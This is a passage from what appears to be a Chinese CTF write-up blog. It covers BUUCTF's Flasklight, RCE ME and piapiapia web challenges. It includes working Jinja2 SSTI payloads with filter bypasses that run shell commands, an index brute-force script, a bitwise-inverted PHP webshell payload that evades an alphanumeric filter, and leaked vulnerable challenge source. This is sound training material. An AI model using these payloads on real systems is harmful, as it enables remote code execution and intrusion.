class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>):<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    url = <span class="hljs-string">&quot;http://9311a17d-d080-40a8-a7f2-83bda4f35d3f.node4.buuoj.cn:81/?search=%7B%7B&#x27;&#x27;.__class__.__base__.__base__.__subclasses__()[&quot;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&quot;]%7D%7D&quot;</span>  <span class="hljs-comment"># 注意这里不能直接加i</span><br><br>    s = requests.get(url=url)<br>    time.sleep(<span class="hljs-number">0.06</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Print&#x27;</span> <span class="hljs-keyword">in</span> s.text:<br>        <span class="hljs-built_in">print</span>(i)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#注意url那里一定要双引号包裹。。</span><br><br><span class="hljs-comment"># 71</span><br></code></pre></td></tr></table></figure><p>然后利用<code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code>去访问这个模块并执行函数：</p><p><img src="/img/flasklight3.png" alt="flasklight3"></p><p>出现了<code>500</code>，<code>__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code>这部分应该触发了过滤，我们按顺序试试关键字发现<code>globals</code>被过滤了，使用字符串拼接绕过：</p><p><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()&#125;&#125;</code></p><p><img src="/img/flasklight4.png" alt="flasklight4"></p><p>然后改变命令去找文件就行</p><p><code>flag&#123;7395b568-25c5-47b8-914a-7338fc453ec2&#125;</code></p><p><code>payload2</code>:</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> b <span class="hljs-keyword">in</span> c.__init__[<span class="hljs-string">&#x27;__glo&#x27;</span>+<span class="hljs-string">&#x27;bals__&#x27;</span>].values() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> b.__class__ == &#123;&#125;.__class__ <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> b.keys() <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; b[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flasklight/coomme_geeeett_youur_flek&quot;).read()&#x27;</span>) &#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><p>最后看下<code>popen</code>和<code>open</code>的区别：</p><p><img src="/img/flasklight6.png" alt="flasklight6"></p><p>如果我们要去读某个已知的文件，可以选择用<code>open</code>，它不要求我们去寻找某个调用<code>os</code>模块的类，但如果我们想执行命令，还是要用<code>popen</code>。</p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>                                                &#125;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>                                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>                                                &#125;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-comment">// ?&gt;</span><br></code></pre></td></tr></table></figure><p>代码很好理解，不过它不光限制了<code>code</code>的长度，而且正则匹配了所有大小写字母加数字？要怎么构建<code>payload</code>？</p><p>网上查了一下<code>RCE过滤字母和数字</code>：<code>https://xz.aliyun.com/t/11929</code></p><p>主要有异或、自增、取反三种方法。取反好理解而且比较短，尝试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ans1</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<span class="hljs-comment">//函数名</span><br><span class="hljs-variable">$ans2</span>=<span class="hljs-string">&#x27;ls&#x27;</span>;<span class="hljs-comment">//命令</span><br><span class="hljs-variable">$data1</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans1</span>));<span class="hljs-comment">//通过两次取反运算得到system</span><br><span class="hljs-variable">$data2</span>=(<span class="hljs-string">&#x27;~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$ans2</span>));<span class="hljs-comment">//通过两次取反运算得到dir</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data1</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;(&#x27;</span>.<span class="hljs-variable">$data2</span>.<span class="hljs-string">&#x27;)&#x27;</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>结果传给<code>code</code>没有任何回显，估计触发了什么关键字，尝试用一句话木马连接：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;assert&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;eval($_REQUEST[1]);&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//https://www.cnblogs.com/Article-kelp/p/14704975.html</span><br>    <br></code></pre></td></tr></table></figure><p><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%CE%A2%D6%C4);</code></p><p><code>POST</code>传<code>1=phpinfo();</code>(<code>PHP Version 7.0.33</code>)，在<code>disable_functions</code>中发现禁用了大量函数：</p><p><img src="/img/qvfan1.png" alt="qvfan1"></p><p>后面有两种解法：</p><p>1.就是利用蚁剑中这个插件(注意要在<code>Linux</code>下使用，安装可以参考<code>[Bypass - 蚁剑菜刀虚拟终端执行命令返回ret=127 | CN-SEC 中文网](https://cn-sec.com/archives/1878964.html)</code>)：</p><p><img src="/img/rceme6.png" alt="rceme6"></p><p><img src="/img/rceme7.png" alt="rceme7"></p><p><img src="/img/rceme5.png" alt="rceme5"></p><p><code>flag&#123;3a24f812-7171-4308-a702-d7a77fd2c2cd&#125;</code></p><p><strong>eval函数中参数是字符</strong>，<strong>assert函数中参数为表达式 （或者为函数</strong></p><p><code>https://www.cnblogs.com/NoCirc1e/p/16275602.html</code></p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>是个登录界面，一开始以为sql注入，但尝试后发现不存在注入点。</p><p><code>www.zip</code>泄露(还挺多的)：</p><p><img src="/img/pia1.png" alt="pia1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &#123; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) <span class="hljs-comment">//限制了用户名和密码的长度</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) <br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br><span class="hljs-keyword">exit</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name or password&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//class.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">mysql</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$table</span> = <span class="hljs-string">&#x27;users&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_exists</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$key_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br><span class="hljs-variable">$value_list</span> = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">insert</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>-&gt;profile;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mysql</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$link</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"><span class="hljs-variable">$config</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-title function_ invoke__">mysql_connect</span>(<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>],<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>]<br>);<br><span class="hljs-title function_ invoke__">mysql_select_db</span>(<span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>]);<br><span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;link;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$ret</span> = <span class="hljs-string">&#x27;*&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT <span class="hljs-subst">$ret</span> FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-variable">$this</span>-&gt;link);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_fetch_object</span>(<span class="hljs-variable">$result</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key_list</span>, <span class="hljs-variable">$value_list</span></span>) </span>&#123;<br><span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$key_list</span>);<br><span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;\&#x27;&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="hljs-variable">$value_list</span>) . <span class="hljs-string">&#x27;\&#x27;&#x27;</span>; <br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO <span class="hljs-subst">$table</span> (<span class="hljs-subst">$key</span>) VALUES (<span class="hljs-subst">$value</span>)&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">return</span> __class__;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>();<br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>(<span class="hljs-variable">$config</span>);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">register</span>.php就是简单的注册功能<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;hostname&#x27;</span>] = <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;database&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;&#x27;</span>; <span class="hljs-comment">//!</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 